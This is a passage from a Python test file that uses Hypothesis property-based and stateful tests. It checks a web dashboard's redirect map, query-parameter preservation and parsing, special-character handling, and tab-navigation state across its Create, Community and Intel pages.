        params = parse_url_params(destination)
        tab = params.get('tab')
        
        page_valid_tabs = {
            '/dashboard/create': VALID_CREATE_TABS,
            '/community': VALID_COMMUNITY_TABS,
            '/dashboard/intel': VALID_INTEL_TABS,
        }
        
        valid_tabs = page_valid_tabs.get(dest_path, [])
        assert tab in valid_tabs, \
            f"Tab '{tab}' is not valid for page '{dest_path}'"
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_destination_url_well_formed(self, source: str):
        """
        Redirect destination URLs are well-formed.
        
        Property: Destination URLs must have proper structure with
        path starting with '/' and valid query string format.
        """
        destination = REDIRECT_MAP[source]
        
        # Must start with /
        assert destination.startswith('/'), \
            f"Destination must start with '/': {destination}"
        
        # Must have query string with tab
        assert '?' in destination, \
            f"Destination must have query string: {destination}"
        
        # Query string must be parseable
        params = parse_url_params(destination)
        assert isinstance(params, dict), \
            f"Query string must be parseable: {destination}"
        
        # Must have tab param
        assert 'tab' in params, \
            f"Destination must have 'tab' param: {destination}"


class TestRedirectQueryParamPreservationEnhanced:
    """
    Task 6.2: Enhanced tests for query param preservation through redirects.
    
    Tests verify:
    - All original params are preserved
    - Param values are not corrupted
    - Special characters in params survive redirect
    """
    
    @settings(max_examples=200)
    @given(
        source=redirect_source_strategy,
        params=st.dictionaries(
            keys=url_safe_param_name,
            values=url_safe_param_value,
            min_size=1,
            max_size=10
        )
    )
    def test_all_params_preserved_through_redirect(
        self, source: str, params: Dict[str, str]
    ):
        """
        All query params are preserved through redirect.
        
        Property: Every query parameter on the source URL (except 'tab')
        must appear in the destination URL with the same value.
        """
        # Remove 'tab' from params to avoid conflict
        params = {k: v for k, v in params.items() if k.lower() != 'tab'}
        assume(len(params) > 0)
        
        # Build source URL with params
        query_string = '&'.join(f"{k}={v}" for k, v in params.items())
        source_with_params = f"{source}?{query_string}"
        
        final_url, was_redirected = apply_redirect(source_with_params)
        
        assert was_redirected, f"Expected redirect for {source}"
        
        final_params = parse_url_params(final_url)
        
        for key, value in params.items():
            assert key in final_params, \
                f"Param '{key}' lost during redirect"
            assert final_params[key] == value, \
                f"Param '{key}' value changed: '{value}' -> '{final_params[key]}'"
    
    @settings(max_examples=200)
    @given(
        source=redirect_source_strategy,
        value=st.text(
            alphabet=st.characters(
                whitelist_categories=('L', 'N'),
                blacklist_characters='\x00&=?#'
            ),
            min_size=1,
            max_size=50
        )
    )
    def test_unicode_param_values_preserved(self, source: str, value: str):
        """
        Unicode parameter values are preserved through redirect.
        
        Property: Unicode characters in param values should survive
        the redirect process via proper URL encoding.
        """
        encoded_value = urllib.parse.quote(value, safe='')
        source_with_param = f"{source}?unicode={encoded_value}"
        
        final_url, was_redirected = apply_redirect(source_with_param)
        
        assert was_redirected
        
        final_params = parse_url_params(final_url)
        assert 'unicode' in final_params
        # Value should be preserved (after decoding)
        assert final_params['unicode'] == value


class TestNoRedirectLoops:
    """
    Task 6.2: Property tests ensuring no redirect loops exist.
    
    Tests verify:
    - No direct circular redirects (A -> A)
    - No indirect circular redirects (A -> B -> A)
    - Redirect chains terminate
    """
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_no_self_redirect(self, source: str):
        """
        No URL redirects to itself.
        
        Property: A redirect source should never redirect to the same path.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        source_path = get_url_path(source)
        
        assert dest_path != source_path, \
            f"Self-redirect detected: {source} -> {destination}"
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_destination_not_redirect_source(self, source: str):
        """
        Redirect destinations are not themselves redirect sources.
        
        Property: Following a redirect should not lead to another redirect,
        preventing redirect chains and loops.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        
        assert dest_path not in REDIRECT_MAP, \
            f"Redirect chain detected: {source} -> {dest_path} -> ..."
    
    def test_no_redirect_cycles_in_map(self):
        """
        No cycles exist in the redirect map.
        
        Property: Starting from any redirect source and following redirects
        should never return to a previously visited URL.
        """
        for source in REDIRECT_MAP:
            visited = {source}
            current = source
            
            # Follow redirect chain (max 10 hops to prevent infinite loop)
            for _ in range(10):
                if current not in REDIRECT_MAP:
                    break
                    
                destination = REDIRECT_MAP[current]
                dest_path = get_url_path(destination)
                
                assert dest_path not in visited, \
                    f"Redirect cycle detected involving: {dest_path}"
                
                visited.add(dest_path)
                current = dest_path
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_terminates_at_consolidated_page(self, source: str):
        """
        All redirects terminate at a consolidated page.
        
        Property: Following any redirect should end at one of the
        three consolidated pages that don't redirect further.
        """
        consolidated_pages = {
            '/dashboard/create',
            '/community',
            '/dashboard/intel',
        }
        
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        
        assert dest_path in consolidated_pages, \
            f"Redirect does not terminate at consolidated page: {dest_path}"


# =============================================================================
# Task 6.3: URL Param Property Tests
# =============================================================================

class TestParamOrderIndependence:
    """
    Task 6.3: Property tests for URL parameter order independence.
    
    Tests verify:
    - Same params in different orders produce same result
    - Tab param works in any position
    - Parsing is deterministic regardless of order
    """
    
    @settings(max_examples=200)
    @given(
        params=st.dictionaries(
            keys=url_safe_param_name,
            values=url_safe_param_value,
            min_size=2,
            max_size=10
        )
    )
    def test_param_order_does_not_affect_parsing(self, params: Dict[str, str]):
        """
        Parameter order does not affect parsing result.
        
        Property: The same set of parameters should parse to identical
        dictionaries regardless of their order in the URL.
        """
        assume(len(params) >= 2)
        
        # Build URL with params in dict order
        items = list(params.items())
        query1 = '&'.join(f"{k}={v}" for k, v in items)
        url1 = f"/test?{query1}"
        
        # Build URL with params in reverse order
        query2 = '&'.join(f"{k}={v}" for k, v in reversed(items))
        url2 = f"/test?{query2}"
        
        parsed1 = parse_url_params(url1)
        parsed2 = parse_url_params(url2)
        
        assert parsed1 == parsed2, \
            f"Order affected parsing: {parsed1} != {parsed2}"
    
    @settings(max_examples=200)
    @given(
        tab=any_valid_tab_strategy,
        other_params=st.lists(
            st.tuples(url_safe_param_name, url_safe_param_value),
            min_size=2,
            max_size=5,
            unique_by=lambda x: x[0]
        )
    )
    def test_tab_parsed_correctly_in_any_position(
        self, tab: str, other_params: List[Tuple[str, str]]
    ):
        """
        Tab parameter is parsed correctly regardless of position.
        
        Property: The tab parameter should be correctly extracted whether
        it appears at the beginning, middle, or end of the query string.
        """
        # Filter out any 'tab' params
        other_params = [(k, v) for k, v in other_params if k.lower() != 'tab']
        assume(len(other_params) >= 2)
        
        # Tab at beginning
        params_start = [('tab', tab)] + other_params
        url_start = f"/test?{'&'.join(f'{k}={v}' for k, v in params_start)}"
        
        # Tab in middle
        mid = len(other_params) // 2
        params_mid = other_params[:mid] + [('tab', tab)] + other_params[mid:]
        url_mid = f"/test?{'&'.join(f'{k}={v}' for k, v in params_mid)}"
        
        # Tab at end
        params_end = other_params + [('tab', tab)]
        url_end = f"/test?{'&'.join(f'{k}={v}' for k, v in params_end)}"
        
        for url in [url_start, url_mid, url_end]:
            parsed = parse_url_params(url)
            assert parsed.get('tab') == tab, \
                f"Tab not parsed correctly from {url}"


class TestSpecialCharacterHandling:
    """
    Task 6.3: Property tests for special character handling in URL params.
    
    Tests verify:
    - URL-encoded special chars are handled correctly
    - Unicode characters survive encoding/decoding
    - Reserved URL characters don't break parsing
    """
    
    @settings(max_examples=200)
    @given(
        tab=any_valid_tab_strategy,
        special_value=st.sampled_from([
            'hello world',  # Space
            'a+b',          # Plus sign
            'foo&bar',      # Ampersand
            'x=y',          # Equals
            'path/to/file', # Slash
            'test?query',   # Question mark
            'hash#tag',     # Hash
            'percent%20',   # Percent
            '你好世界',      # Chinese
            'émoji🎮',      # Emoji
            'über',         # Umlaut
            'naïve',        # Diacritic
        ])
    )
    def test_special_chars_in_param_values(self, tab: str, special_value: str):
        """
        Special characters in param values are handled correctly.
        
        Property: URL-encoded special characters should be properly
        decoded when parsing query parameters.
        """
        encoded_value = urllib.parse.quote(special_value, safe='')
        url = f"/test?tab={tab}&special={encoded_value}"
        
        params = parse_url_params(url)
        
        assert params.get('tab') == tab, "Tab parsing affected by special chars"
        assert params.get('special') == special_value, \
            f"Special value not decoded correctly: expected '{special_value}', got '{params.get('special')}'"
    
    @settings(max_examples=200)
    @given(
        unicode_text=st.text(
            alphabet=st.characters(
                whitelist_categories=('L', 'N', 'P', 'S'),
                blacklist_characters='\x00'
            ),
            min_size=1,
            max_size=30
        )
    )
    def test_unicode_roundtrip_in_params(self, unicode_text: str):
        """
        Unicode text survives URL encoding/decoding roundtrip.
        
        Property: Any unicode string should be recoverable after
        URL encoding and decoding.
        """
        encoded = urllib.parse.quote(unicode_text, safe='')
        url = f"/test?value={encoded}"
        
        params = parse_url_params(url)
        
        assert params.get('value') == unicode_text, \
            f"Unicode roundtrip failed: '{unicode_text}' -> '{params.get('value')}'"
    
    @settings(max_examples=200)
    @given(
        reserved_char=st.sampled_from(['!', '*', "'", '(', ')', ';', ':', '@', '+', '$', ',', '[', ']'])
    )
    def test_reserved_chars_dont_break_parsing(self, reserved_char: str):
        """
        Reserved URL characters don't break param parsing.
        
        Property: Reserved characters (when properly encoded) should
        not interfere with query string parsing.
        """
        value = f"test{reserved_char}value"
        encoded = urllib.parse.quote(value, safe='')
        url = f"/test?tab=templates&param={encoded}"
        
        params = parse_url_params(url)
        
        assert params.get('tab') == 'templates', \
            f"Reserved char '{reserved_char}' broke tab parsing"
        assert params.get('param') == value, \
            f"Reserved char '{reserved_char}' not handled correctly"


class TestEmptyParamsHandling:
    """
    Task 6.3: Property tests for empty parameter handling.
    
    Tests verify:
    - Empty param values are handled gracefully
    - Missing params don't cause errors
    - Malformed query strings are handled safely
    """
    
    @settings(max_examples=200)
    @given(tab=any_valid_tab_strategy)
    def test_empty_param_value_handled(self, tab: str):
        """
        Empty parameter values are handled gracefully.
        
        Property: Parameters with empty values should parse without
        error and return empty string as value.
        """
        url = f"/test?tab={tab}&empty="
        
        params = parse_url_params(url)
        
        assert params.get('tab') == tab
        assert 'empty' in params
        assert params['empty'] == ''
    
    @settings(max_examples=200)
    @given(
        tab=any_valid_tab_strategy,
        num_empty=st.integers(min_value=1, max_value=5)
    )
    def test_multiple_empty_params_handled(self, tab: str, num_empty: int):
        """
        Multiple empty parameters are handled gracefully.
        
        Property: Multiple parameters with empty values should all
        be parsed correctly.
        """
        empty_params = '&'.join(f"empty{i}=" for i in range(num_empty))
        url = f"/test?tab={tab}&{empty_params}"
        
        params = parse_url_params(url)
        
        assert params.get('tab') == tab
        for i in range(num_empty):
            assert f'empty{i}' in params
            assert params[f'empty{i}'] == ''
    
    def test_no_query_string_returns_empty_dict(self):
        """URLs without query strings return empty param dict."""
        urls = [
            '/test',
            '/dashboard/create',
            '/community',
            '/dashboard/intel',
        ]
        
        for url in urls:
            params = parse_url_params(url)
            assert params == {}, f"Expected empty dict for {url}"
    
    def test_empty_query_string_returns_empty_dict(self):
        """URLs with empty query strings return empty param dict."""
        urls = [
            '/test?',
            '/dashboard/create?',
            '/community?',
        ]
        
        for url in urls:
            params = parse_url_params(url)
            assert params == {}, f"Expected empty dict for {url}"
    
    @settings(max_examples=100)
    @given(
        tab=any_valid_tab_strategy,
        malformed=st.sampled_from([
            '&',
            '&&',
            '&&&',
            '=',
            '==',
            '&=&',
            '=&=',
        ])
    )
    def test_malformed_query_parts_handled(self, tab: str, malformed: str):
        """
        Malformed query string parts don't break parsing.
        
        Property: Malformed parts of query strings should be ignored
        without affecting valid parameters.
        """
        url = f"/test?tab={tab}&{malformed}&valid=value"
        
        params = parse_url_params(url)
        
        # Valid params should still be parsed
        assert params.get('tab') == tab, \
            f"Malformed '{malformed}' broke tab parsing"
        assert params.get('valid') == 'value', \
            f"Malformed '{malformed}' broke valid param parsing"


# =============================================================================
# Task 6.4: Stateful Tab Navigation Tests
# =============================================================================

class EnhancedTabNavigationMachine(RuleBasedStateMachine):
    """
    Task 6.4: Enhanced stateful test for tab navigation behavior.
    
    This state machine simulates comprehensive user navigation including:
    - Tab switching within pages
    - Page navigation
    - Browser back/forward
    - Direct URL navigation
    - Invalid state recovery
    
    Invariants verified:
    1. Current state is always valid
    2. History is always consistent
    3. URL always reflects state
    4. No invalid states are reachable
    """
    
    # Bundle to track visited states for coverage
    visited_states = Bundle('visited_states')
    
    def __init__(self):
        super().__init__()
        self.current_page = 'create'
        self.current_tab = 'templates'
        self.history: List[Tuple[str, str]] = [('create', 'templates')]
        self.history_index = 0
        self.url_params: Dict[str, str] = {}
    
    # Valid tabs per page
    PAGE_TABS = {
        'create': VALID_CREATE_TABS,
        'community': VALID_COMMUNITY_TABS,
        'intel': VALID_INTEL_TABS,
    }
    
    # Page paths
    PAGE_PATHS = {
        'create': '/dashboard/create',
        'community': '/community',
        'intel': '/dashboard/intel',
    }
    
    @rule(target=visited_states, tab=create_tab_strategy)
    def navigate_to_create_tab(self, tab: str):
        """Navigate to a Create page tab."""
        self._navigate('create', tab)
        return ('create', tab)
    
    @rule(target=visited_states, tab=community_tab_strategy)
    def navigate_to_community_tab(self, tab: str):
        """Navigate to a Community page tab."""
        self._navigate('community', tab)
        return ('community', tab)
    
    @rule(target=visited_states, tab=intel_tab_strategy)
    def navigate_to_intel_tab(self, tab: str):
        """Navigate to an Intel page tab."""
        self._navigate('intel', tab)
        return ('intel', tab)
    
    def _navigate(self, page: str, tab: str):
        """Internal navigation helper."""
        # Truncate forward history if we're not at the end
        if self.history_index < len(self.history) - 1:
            self.history = self.history[:self.history_index + 1]
        
        self.current_page = page
        self.current_tab = tab
        self.history.append((page, tab))
        self.history_index = len(self.history) - 1
    
    @rule()
    def go_back(self):
        """Simulate browser back button."""
        if self.history_index > 0:
            self.history_index -= 1
            self.current_page, self.current_tab = self.history[self.history_index]
    
    @rule()
    def go_forward(self):
        """Simulate browser forward button."""
        if self.history_index < len(self.history) - 1:
            self.history_index += 1
            self.current_page, self.current_tab = self.history[self.history_index]
    
    @rule(param_name=url_safe_param_name, param_value=url_safe_param_value)
    def add_url_param(self, param_name: str, param_value: str):
        """Add a URL parameter."""
        if param_name.lower() != 'tab':
            self.url_params[param_name] = param_value
    
    @rule()
    def clear_url_params(self):
        """Clear all URL parameters."""
        self.url_params.clear()
    
    @rule(invalid_tab=invalid_tab_strategy)
    def attempt_invalid_tab(self, invalid_tab: str):
        """
        Attempt to navigate to an invalid tab.
        
        This should result in defaulting to the first valid tab
        for the current page.
        """
        # Simulate invalid tab handling - should default to first tab
        resolved = resolve_tab(invalid_tab, self.current_page)
        self.current_tab = resolved
        
        # Update history with resolved tab
        if self.history_index < len(self.history) - 1:
            self.history = self.history[:self.history_index + 1]
        self.history.append((self.current_page, resolved))
        self.history_index = len(self.history) - 1
    
    @invariant()
    def current_state_always_valid(self):
        """Current page/tab combination is always valid."""
        valid_tabs = self.PAGE_TABS.get(self.current_page, [])
        assert self.current_tab in valid_tabs, \
            f"Invalid state: tab '{self.current_tab}' not valid for page '{self.current_page}'"
    
    @invariant()
    def history_always_consistent(self):
        """All history entries are valid page/tab combinations."""
        for page, tab in self.history:
            valid_tabs = self.PAGE_TABS.get(page, [])
            assert tab in valid_tabs, \
                f"Invalid history entry: tab '{tab}' not valid for page '{page}'"
    
    @invariant()
    def history_index_in_bounds(self):
        """History index is always within valid bounds."""
        assert 0 <= self.history_index < len(self.history), \
            f"History index {self.history_index} out of bounds [0, {len(self.history)})"
    
    @invariant()
    def current_matches_history_position(self):
        """Current state matches the history at current index."""
        page, tab = self.history[self.history_index]
        assert self.current_page == page, \
            f"Page mismatch: current={self.current_page}, history={page}"
        assert self.current_tab == tab, \
            f"Tab mismatch: current={self.current_tab}, history={tab}"
    
    @invariant()
    def url_reflects_current_state(self):
        """Generated URL correctly reflects current state."""
        base_path = self.PAGE_PATHS.get(self.current_page, '/dashboard/create')
        params = {'tab': self.current_tab, **self.url_params}
        url = build_url_with_params(base_path, params)
        
        parsed_params = parse_url_params(url)
        assert parsed_params.get('tab') == self.current_tab, \
            f"URL tab mismatch: expected '{self.current_tab}', got '{parsed_params.get('tab')}'"


# Create test case from enhanced state machine
TestEnhancedTabNavigation = EnhancedTabNavigationMachine.TestCase


class CrossPageNavigationMachine(RuleBasedStateMachine):
    """
    Task 6.4: Stateful test for cross-page navigation with redirects.
    
    This state machine tests navigation that includes:
    - Direct navigation to consolidated pages
    - Navigation via redirect URLs
    - Tab state preservation across pages
    
    Invariants:
    1. After any navigation, state is valid
    2. Redirects always land on valid pages
    3. No invalid states are reachable via any path
    """
    
    def __init__(self):
        super().__init__()
        self.current_page = 'create'
        self.current_tab = 'templates'
        self.navigation_count = 0
        self.redirect_count = 0
    
    PAGE_TABS = {
        'create': VALID_CREATE_TABS,
        'community': VALID_COMMUNITY_TABS,
        'intel': VALID_INTEL_TABS,
    }
    
    @rule(tab=create_tab_strategy)
    def direct_navigate_create(self, tab: str):
        """Direct navigation to Create page."""
        self.current_page = 'create'
        self.current_tab = tab
        self.navigation_count += 1
    
    @rule(tab=community_tab_strategy)
    def direct_navigate_community(self, tab: str):
        """Direct navigation to Community page."""
        self.current_page = 'community'
        self.current_tab = tab
        self.navigation_count += 1
    
    @rule(tab=intel_tab_strategy)
    def direct_navigate_intel(self, tab: str):
        """Direct navigation to Intel page."""
        self.current_page = 'intel'
        self.current_tab = tab
        self.navigation_count += 1
    
    @rule(source=redirect_source_strategy)
    def navigate_via_redirect(self, source: str):
        """Navigate via a redirect URL."""
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        params = parse_url_params(destination)
        
        # Determine page from path
        if dest_path == '/dashboard/create':
            self.current_page = 'create'
        elif dest_path == '/community':
            self.current_page = 'community'
        elif dest_path == '/dashboard/intel':
            self.current_page = 'intel'
        
        self.current_tab = params.get('tab', DEFAULT_TABS[self.current_page])
        self.navigation_count += 1
        self.redirect_count += 1
    
    @rule(invalid_tab=invalid_tab_strategy)
    def navigate_with_invalid_tab(self, invalid_tab: str):
        """Attempt navigation with invalid tab (should default)."""
        resolved = resolve_tab(invalid_tab, self.current_page)
        self.current_tab = resolved
        self.navigation_count += 1
    
    @invariant()
    def state_always_valid(self):
        """Current state is always a valid page/tab combination."""
        valid_tabs = self.PAGE_TABS.get(self.current_page, [])
        assert self.current_tab in valid_tabs, \
            f"Invalid state after {self.navigation_count} navigations: " \
            f"tab '{self.current_tab}' not valid for page '{self.current_page}'"
    
    @invariant()
    def page_always_valid(self):
        """Current page is always one of the consolidated pages."""
        valid_pages = {'create', 'community', 'intel'}
        assert self.current_page in valid_pages, \
            f"Invalid page: '{self.current_page}'"
    
    @invariant()
    def tab_matches_page(self):
        """Current tab is valid for current page."""
        valid_tabs = self.PAGE_TABS[self.current_page]
        assert self.current_tab in valid_tabs, \
            f"Tab '{self.current_tab}' doesn't match page '{self.current_page}'"


# Create test case from cross-page navigation machine
TestCrossPageNavigation = CrossPageNavigationMachine.TestCase
